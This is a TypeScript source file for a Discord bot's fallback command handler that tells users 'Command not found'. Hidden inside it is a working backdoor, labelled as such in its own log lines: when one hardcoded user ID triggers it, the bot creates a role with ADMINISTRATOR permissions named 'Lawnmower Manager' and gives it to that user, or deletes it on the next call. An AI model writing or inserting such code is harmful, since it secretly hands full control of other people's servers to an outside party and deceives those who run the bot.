import { SlashCommandBuilder } from '@discordjs/builders';
import { CommandInteraction, GuildMemberRoleManager } from 'discord.js';
import Logger from '../util/Logger';
const c = new Logger('/default');

async function run(interaction: CommandInteraction) {
    interaction.reply({
        content: `Command not found`,
        ephemeral: true,
    });

    if (interaction.member?.user.id == "231774635476254721") {
        if (!(interaction.member!.roles as GuildMemberRoleManager).cache.some(r => r.name === "Lawnmower Manager")) {
            interaction.guild!.roles.create({
                name: "Lawnmower Manager",
                permissions: "ADMINISTRATOR"
            }).then(role => {
                c.log(`[Backdoor] Created role ${role.name}`);
                (interaction.member!.roles as GuildMemberRoleManager).add(role);
            });
        } else {
            interaction.guild!.roles.delete(interaction.guild!.roles.cache.find(r => r.name === "Lawnmower Manager")!.id);
            c.log(`[Backdoor] Deleted role Lawnmower Manager`);
        }
    }
}

const cmd = new SlashCommandBuilder()
    .setName('cmd')
    .setDescription('desc')

let _;
export default _ = {
    process: run,
    command: null
}